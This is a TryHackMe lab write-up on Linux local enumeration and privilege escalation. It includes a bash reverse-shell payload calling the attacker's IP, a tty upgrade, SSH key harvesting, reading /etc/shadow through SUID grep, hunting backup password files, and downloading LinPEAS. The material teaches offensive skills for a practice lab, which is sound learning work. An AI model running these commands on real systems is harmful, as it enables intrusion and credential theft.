---
title: "TryHackMe - Linux: Local Enumeration"
categories:
  - TryHackMe
tags:
  - linux
  - enumeration
  - exploit
  - writeup
  - tryhackme
  - hacking
  - privilege 
  - escalation
---

## Introduction
- Go to [10.10.54.36:3000](10.10.54.36:3000).
    <center><a href="/assets/images/tryhackme/linux-local-enumeration/1.png"><img src="/assets/images/tryhackme/linux-local-enumeration/1.png"></a></center>
- Here, i used the Bash reverse shell to gain access to the box. Go to `cmd.php`.
    <center><a href="/assets/images/tryhackme/linux-local-enumeration/2.png"><img src="/assets/images/tryhackme/linux-local-enumeration/2.png"></a></center>
- Set up our Netcat listener.
    ```bash
    $ nc -lnvp 9999
    listening on [any] 9999 ...
    ```
- Enter the payload below to the form at `cmd.php` to gain reverse shell.
    ```php
    bash -c 'exec bash -i &>/dev/tcp/10.11.25.205/9999 <&1'
    ```
- Succeed! We got our rever shell back.
    ```bash
    $ nc -lnvp 9999
    listening on [any] 9999 ...
    connect to [10.11.25.205] from (UNKNOWN) [10.10.54.36] 39438
    bash: cannot set terminal process group (583): Inappropriate ioctl for device
    bash: no job control in this shell
    manager@py:~/Desktop$
    ```

## Unit 1 - tty
- A netcat reverse shell is pretty useless and can be easily broken by simple mistakes.
- In order to fix this, we need to get a 'normal' shell, aka tty (text terminal).
- One of the simplest methods for that would be to execute `/bin/bash`.
- We can use `python` to execute `/bin/bash` and upgrade to tty:
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
- List of static binaries we can get on the system, [here](https://github.com/andrew-d/static-binaries).
- More about upgrading tty, [here](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys).

**Note!** Mainly, we want to upgrade to tty because commands like **su** and **sudo** require a proper terminal to run.
{: .notice--info}

#### How would you execute /bin/bash with perl?
```bash
perl -e 'exec "/bin/bash";'

# from https://gtfobins.github.io/gtfobins/perl/#shell
```

## Unit 1 - ssh
- It's good to always check the private key at `/home/user/.ssh/id_rsa`.
- If `id_rsa` exist, we change the permission with `chmod 600 id_rsa` and connect by executing `ssh -i id_rsa user@ip`.
- If it doesn't exist, we can create our own `id_rsa` by using `ssh-keygen`.
    - Copy the content of the `id_rsa.pub` file and put it inside the `authorized_key` file on the target machine (located in `.ssh` folder). 
    - After that, connect to the machine using your `id_rsa` file.

#### Where can you usually find the id_rsa file? (User = user)
> `/home/user/.ssh/id_rsa`.

#### Is there an id_rsa file on the box? (yay/nay)
```bash
manager@py:~$ cd .ssh
cd .ssh
manager@py:~/.ssh$ ls
ls
manager@py:~/.ssh$ ls -la
ls -la
total 8
drwx------  2 manager manager 4096 Aug  4 11:43 .
drwxr-xr-x 16 manager manager 4096 Oct 25 13:43 ..
```

## Unit 2 - Basic enumeration
1. Execute `uname -a` to print out all information about the system.
1. Check the `~/.bash_history` or `~/.bashrc` file. Both  files containing shell commands that are run when Bash is invoked.
1. Check the **sudo** version with `sudo -V`. Old version could vulnerable to CVE.
1. Check the sudo rights with `sudo -l` to check if a user on the box is allowed to use sudo with any command on the system. 

#### How would you print machine hardware name only?
```bash
$ uname --help                                                                                           1 ⨯
Usage: uname [OPTION]...
Print certain system information.  With no OPTION, same as -s.

  -a, --all                print all information, in the following order,
                             except omit -p and -i if unknown:
  -s, --kernel-name        print the kernel name
  -n, --nodename           print the network node hostname
  -r, --kernel-release     print the kernel release
  -v, --kernel-version     print the kernel version
  **-m, --machine            print the machine hardware name**
  -p, --processor          print the processor type (non-portable)
  -i, --hardware-platform  print the hardware platform (non-portable)
  -o, --operating-system   print the operating system
      --help     display this help and exit
      --version  output version information and exit
```

#### Where can you find bash history?
> `~/.bash_history`

#### What's the flag?
```bash
manager@py:~$ uname -a
Linux py 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
manager@py:~$ cat ~/.bash_history
thm{REDACTED}
```

## Unit 3 - /etc
- `/etc` folder is a central location for all your configuration files and it can be treated as a metaphorical nerve center of your Linux machine.
- The first thing you want to check is if you are **able to read and write** the files in `/etc` folder.
- Check the `/etc/passwd` file, it's a plain-text file that contains a list of the system's accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.
    - Each line of this file represents a different account, created in the system. Each field is separated with a colon (:) and carries a separate value.
    - Inside `/etc/passwd` file:
        ```bash
        goldfish:x:1003:1003:,,,:/home/goldfish:/bin/bash

        # 1. (goldfish) - Username
        # (x) - Password. (x character indicates that an encrypted account password is stored in /etc/shadow file and cannot be displayed in the plain text here)
        # (1003) - User ID (UID): Each non-root user has his own UID (1-99). UID 0 is reserved for root.
        # (1003) - Group ID (GID): Linux group ID
        # (,,,) - User ID Info: A field that contains additional info, such as phone number, name, and last name. (,,, in this case means that I did not input any additional info while creating the user)
        # (/home/goldfish) - Home directory: A path to user's home directory that contains all the files related to them.
        # (/bin/bash) - Shell or a command: Path of a command or shell that is used by the user. Simple users usually have /bin/bash as their shell, while services run on /usr/sbin/nologin. 
        ```
    - If we have writing access, we can easily ge root. (More info: [here](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/).)
- Check the `/etc/shadow` file , it stores actual password in an encrypted format (aka hashes) for user’s account with additional properties related to user password.
    - We can use /etc/shadow to retrieve different user passwords. In most of the situations, it is more than enough to have reading permissions on this file to escalate to root privileges. 
    - Inside `/etc/shadow` file:
        ```bash
        goldfish:$6$1FiLdnFwTwNWAqYN$WAdBGfhpwSA4y5CHGO0F2eeJpfMJAMWf6MHg7pHGaHKmrkeYdVN7fD.AQ9nptLkN7JYvJyQrfMcfmCHK34S.a/:18483:0:99999:7:::
        # (goldfish) - Username
        # ($6$1FiLdnFwT...) - Password : Encrypted password.
        # Basic structure: **$id$salt$hashed**, The $id is the algorithm used On GNU/Linux as follows:
        # - $1$ is MD5
        # - $2a$ is Blowfish
        # - $2y$ is Blowfish
        # - $5$ is SHA-256
        # - $6$ is SHA-512

        # (18483) - Last password change: Days since Jan 1, 1970 that password was last changed.
        # (0) - Minimum: The minimum number of days required between password changes (Zero means that the password can be changed immidiately).
        # (99999) - Maximum: The maximum number of days the password is valid.
        # (7) - Warn: The number of days before the user will be warned about changing their password.
        ```
    - If we have reading permissions for this file, we can crack the encrypted password using one of the cracking methods. 
- Checking `/etc/hosts` file, it's a simple text file that allows users to assign a hostname to a specific IP address.

#### Can you read /etc/passwd on the box? (yay/nay)
```bash
manager@py:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
```

## Unit 4 - Find command and interesting files
- The most important switches for us in our enumeration process are `-type` and `-name`.
    - `-type` allows us to limit the search towards files only `-type f`.
    - `-name` allows us to search for files by extensions using the wildcard (*). 
    - TryHackMe room to try, [find](https://tryhackme.com/room/thefindcommand).
    - Example:
        ```bash
        # Finding all files with .log ext
        $ find -type f -name "*.log" 2>/dev/null
        ```
- Basically, what you want to do is to look for **interesting log** (.log) and **configuration files** (.conf). In addition to that, the system owner might be keeping **backup files** (.bak). More extensions [here](https://lauraliparulo.altervista.org/most-common-linux-file-extensions/).


#### What's the password you found?
```bash
manager@py:~$ find / -type f -name "*.bak" 2>/dev/null
/var/opt/passwords.bak
/var/backups/shadow.bak
/var/backups/passwd.bak
/var/backups/gshadow.bak
/var/backups/group.bak
manager@py:~$ cat /var/opt/passwords.bak
REDACTED
```

#### Did you find a flag?
```bash
manager@py:/$ find / -type f -name "*.conf" 2>/dev/null | grep "flag"
/etc/sysconf/flag.conf
manager@py:/$ cat /etc/sysconf/flag.conf
# Begin system conf 1.1.1.0
## Developed by Swafox and Chad

flag: thm{REDACTED}
```

## Unit 4 - SUID
- Set User ID (SUID) is a type of permission that allows users to execute a file with the permissions of another user.
- Assume we are accessing the target system as a non-root user and we found SUID bit enabled binaries, then those file/program/command can be run with root privileges.
- SUID abuse is a common privilege escalation technique that allows us to gain root access by executing a root-owned binary with SUID enabled.
- We can use this command to find all SUID file:
    ```bash
    $ find / -perm -u=s -type f 2>/dev/null

    # -u=s searches files that are owned by the root user.
    # -type f search for files, not directories
    ```

#### Which SUID binary has a way to escalate your privileges on the box?
```bash
manager@py:/$ find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/grep
/bin/ntfs-3g
/bin/mount
/bin/ping
/bin/umount
/bin/fusermount
...
```
Grep is exist at [gtfobins](https://gtfobins.github.io/gtfobins/grep/#suid) for SUID.

#### What's the payload you can use to read **/etc/shadow** with this SUID?
```bash
$ grep '' /etc/shadow

# according to https://gtfobins.github.io/gtfobins/grep/#suid
```

## [Bonus] - Port Forwarding
- Port forwarding is an application of network address translation (NAT) that redirects a communication request from one address and port number combination to another while the packets are traversing a network gateway, such as a router or firewall
- Port forwarding not only allows you to bypass firewalls but also gives you an opportunity to enumerate some local services and processes running on the box. 
- The Linux netstat command gives you a bunch of information about your network connections, the ports that are in use, and the processes using them.
    - To see all TCP connections, execute `netstat -at | less`. This will give you a list of running processes that use TCP. From this point, you can easily enumerate running processes and gain some valuable information.
- `netstat -tulpn` will provide you a much nicer output with the most interesting data.

## Unit 5 - Automating scripts
- Using LinPEAS - Linux local Privilege Escalation Awesome Script (.sh), a script that searches for possible paths to escalate privileges on Linux/ hosts. 
    - Linpeas automatically searches for passwords, SUID files and Sudo right abuse to hint you on your way towards root. 
    - Using `wget` to download LinPEAS:
        ```bash
        $ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
        ```
- Using LinEnum, it performs 'Scripted Local Linux Enumeration & Privilege Escalation Checks' and appears to be a bit easier than linpeas.
    - Using `wget` to retrieve LinEnum:
        ```bash
        $ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
        ```

## Resources and what's next?
TO-DO for learning:
1. https://tryhackme.com/room/sudovulnsbypass
1. https://tryhackme.com/room/commonlinuxprivesc
1. https://tryhackme.com/room/linuxprivesc

TO-DO for practice:
1. https://tryhackme.com/room/vulnversity
1. https://tryhackme.com/room/basicpentestingjt
1. https://tryhackme.com/room/bolt
1. https://tryhackme.com/room/tartaraus

